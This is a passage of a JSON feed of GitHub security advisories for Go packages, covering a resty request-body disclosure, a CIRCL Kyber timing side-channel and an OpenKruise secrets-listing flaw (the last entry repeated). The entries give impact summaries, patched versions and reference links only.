href=\"https://github.com/advisories/GHSA-xwh9-gc39-5298\">https://github.com/advisories/GHSA-xwh9-gc39-5298</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xwh9-gc39-5298",
            "title": "[github.com/go-resty/resty/v2] github.com/go-resty/resty/v2 HTTP request body disclosure",
            "date_modified": "2024-01-08T20:30:35.000Z",
            "date_published": "2023-11-28T17:36:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xwh9-gc39-5298"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>On some platforms, when an attacker can time decapsulation of Kyber on forged cipher texts, they could possibly learn (parts of) the secret key.</p>\n<p>Does not apply to ephemeral usage, such as when used in the regular way in TLS.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in 1.3.7.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://kyberslash.cr.yp.to/\">kyberslash.cr.yp.to</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cloudflare/circl/security/advisories/GHSA-9763-4f94-gfch\">https://github.com/cloudflare/circl/security/advisories/GHSA-9763-4f94-gfch</a></li>\n<li><a href=\"https://github.com/cloudflare/circl/commit/75ef91e8a2f438e6ce2b6e620d236add8be1887d\">https://github.com/cloudflare/circl/commit/75ef91e8a2f438e6ce2b6e620d236add8be1887d</a></li>\n<li><a href=\"https://kyberslash.cr.yp.to/\">https://kyberslash.cr.yp.to/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9763-4f94-gfch\">https://github.com/advisories/GHSA-9763-4f94-gfch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9763-4f94-gfch",
            "title": "[github.com/cloudflare/circl] CIRCL's Kyber: timing side-channel (kyberslash2)",
            "date_modified": "2024-01-08T16:45:06.000Z",
            "date_published": "2024-01-08T16:45:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9763-4f94-gfch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Attacker that has gain root privilege of the node that kruise-daemon run , can leverage the kruise-daemon pod to list all secrets in the entire cluster. After that, attackers can leverage the \"captured\" secrets (e.g. the kruise-manager service account token) to gain extra privilege such as pod modification. </p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For users that do not require imagepulljob functions, they can modify kruise-daemon-role to drop the cluster level secret get/list privilege </p>\n<h3 id=\"patches\">Patches</h3>\n<p>For users who're using v0.8.x ~ v1.2.x, please update the v1.3.1\nFor users who're using v1.3, please update the v1.3.1\nFor users who're using v1.4, please update the v1.4.1\nFor users who're using v1.5, please update the v1.5.2</p>\n<h3 id=\"references\">References</h3>\n<p>None</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openkruise/kruise/security/advisories/GHSA-437m-7hj5-9mpw\">https://github.com/openkruise/kruise/security/advisories/GHSA-437m-7hj5-9mpw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-30617\">https://nvd.nist.gov/vuln/detail/CVE-2023-30617</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-437m-7hj5-9mpw\">https://github.com/advisories/GHSA-437m-7hj5-9mpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-437m-7hj5-9mpw",
            "title": "[github.com/openkruise/kruise] Kruise allows leveraging the kruise-daemon pod to list all secrets in the entire cluster",
            "date_modified": "2024-01-05T16:01:24.000Z",
            "date_published": "2024-01-05T16:01:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-437m-7hj5-9mpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Attacker that has gain root privilege of the node that kruise-daemon run , can leverage the kruise-daemon pod to list all secrets in the entire cluster. After that, attackers can leverage the \"captured\" secrets (e.g. the kruise-manager service account token) to gain extra privilege such as pod modification. </p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For users that do not require imagepulljob functions, they can modify kruise-daemon-role to drop the cluster level secret get/list privilege </p>\n<h3 id=\"patches\">Patches</h3>\n<p>For users who're using v0.8.x ~ v1.2.x, please update the v1.3.1\nFor users who're using v1.3, please update the v1.3.1\nFor users who're using v1.4, please update the v1.4.1\nFor users who're using v1.5, please update the v1.5.2</p>\n<h3 id=\"references\">References</h3>\n<p>None</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openkruise/kruise/security/advisories/GHSA-437m-7hj5-9mpw\">https://github.com/openkruise/kruise/security/advisories/GHSA-437m-7hj5-9mpw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-30617\">https://nvd.nist.gov/vuln/detail/CVE-2023-30617</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-437m-7hj5-9mpw\">https://github.com/advisories/GHSA-437m-7hj5-9mpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-437m-7hj5-9mpw",
            "title": "[github.com/openkruise/kruise] Kruise allows leveraging the kruise-daemon pod to list all secrets in the entire cluster",
            "date_modified": "2024-01-05T16:01:24.000Z",
            "date_published": "2024-01-05T16:01:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-437m-7hj5-9mpw"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}